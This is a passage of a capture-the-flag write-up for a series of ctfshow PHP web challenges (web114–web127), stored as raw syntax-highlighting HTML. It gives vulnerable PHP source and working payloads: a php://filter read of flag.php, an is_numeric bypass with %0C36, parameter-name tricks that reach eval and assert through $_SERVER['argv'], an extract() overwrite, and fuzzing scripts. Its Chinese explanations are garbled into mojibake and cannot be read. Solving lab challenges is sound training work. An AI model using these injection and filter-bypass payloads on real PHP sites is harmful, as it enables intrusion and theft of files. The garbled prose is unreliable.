class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?file=php://filter/resource=flag.php</code></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> hacker<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦æ»¡è¶³ä»€ä¹ˆï¼šnumé€šè¿‡is_numericçš„æ£€æµ‹ï¼Œå¹¶ä¸”ä¸ç­‰äº36ï¼Œå»ç©ºåä¾ç„¶ä¸ç­‰äº36ï¼Œç»è¿‡è¿‡æ»¤æ–¹æ³•åä¾ç„¶ç­‰äº36</p><p>fuzzè„šæœ¬ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°ï¼š<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p><p><a href="https://tool.oschina.net/commons?type=4" target="_blank" rel="noopener">ASCIIå¯¹ç…§è¡¨</a></p><p>payloadï¼š<code>%0C36</code></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„çš„phpç‰¹æ€§ï¼šåœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†ï¼Œsuch asï¼š<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p><p>payloadï¼š<code>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</code></p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php" target="_blank" rel="noopener">$argv</a>ï¼šä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç»„</p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html" target="_blank" rel="noopener">è¯¦è§£ $_SERVER å‡½æ•°ä¸­QUERY_STRINGå’ŒREQUEST_URIåŒºåˆ«(è½¬)</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span>ï¼š<span class="token number">1</span>ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹    ç¬¬ä¸€ä¸ªå‚æ•°<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°<span class="token number">2</span>ã€webç½‘é¡µæ¨¡å¼ä¸‹    åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php<span class="token punctuation">.</span>iniå¼€å¯register_argc_argvé…ç½®é¡¹    è®¾ç½®register_argc_argv <span class="token operator">=</span> <span class="token function">On</span><span class="token punctuation">(</span>é»˜è®¤æ˜¯Off<span class="token punctuation">)</span>ï¼Œé‡å¯æœåŠ¡ï¼Œ<span class="token variable">$_SERVER</span><span class="token punctuation">[</span>â€˜argvâ€™<span class="token punctuation">]</span>æ‰ä¼šæœ‰æ•ˆæœ    è¿™æ—¶å€™çš„<span class="token variable">$_SERVER</span><span class="token punctuation">[</span>â€˜argvâ€™<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span>â€˜<span class="token constant">QUERY_STRING</span>â€™<span class="token punctuation">]</span>    <span class="token variable">$argv</span><span class="token punctuation">,</span><span class="token variable">$argc</span>åœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬æ˜¯åœ¨ç½‘é¡µæ¨¡å¼ä¸‹çš„ï¼Œæ³¨æ„é‡ç‚¹ï¼š<br><code>$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]</code><br>è€Œ <code>$_SERVER[â€˜QUERY_STRINGâ€™]</code> <strong>æ˜¯è·å–æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿå°±æ˜¯?åé¢çš„è¯­å¥</strong></p><p>ä¸¾ä¸ªä¾‹å­</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span>â€˜<span class="token constant">QUERY_STRING</span>â€™<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token shell-comment comment"># POST</span><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token punctuation">;</span> <span class="token shell-comment comment">#GET</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#POST</span><span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>flag<span class="token punctuation">.</span>php        <span class="token shell-comment comment">#GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> æ–­è¨€ï¼š<span class="token constant">PHP</span> <span class="token number">5</span>bool <span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token constant">PHP</span> <span class="token number">7</span>bool <span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span>å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> å½“åš <span class="token constant">PHP</span> ä»£ç æ¥æ‰§è¡Œå¯è§ï¼Œevalå’Œassertéƒ½å¯ä»¥å°†å­—ç¬¦å½“ä½œä»£ç æ‰§è¡Œï¼Œåªä¸è¿‡assertä¸éœ€è¦ä¸¥æ ¼éµä»è¯­æ³•ï¼Œæ¯”å¦‚è¯­å¥æœ«å°¾çš„åˆ†å·å¯ä¸åŠ <span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract(æå–ã€æŠ½å–)å‡½æ•°</a>ï¼šé€šå¸¸æƒ…å†µç»“åˆæ•°ç»„ä½¿ç”¨</p><p>?ctf_show=ilove36dä½†æ˜¯ä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†</p><p>è‡ªå·±å†™ä¸ªfuzzè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"æœªç¼–ç ï¼š"</span><span class="token punctuation">.</span><span class="token variable">$num</span><span class="token punctuation">.</span><span class="token string">"   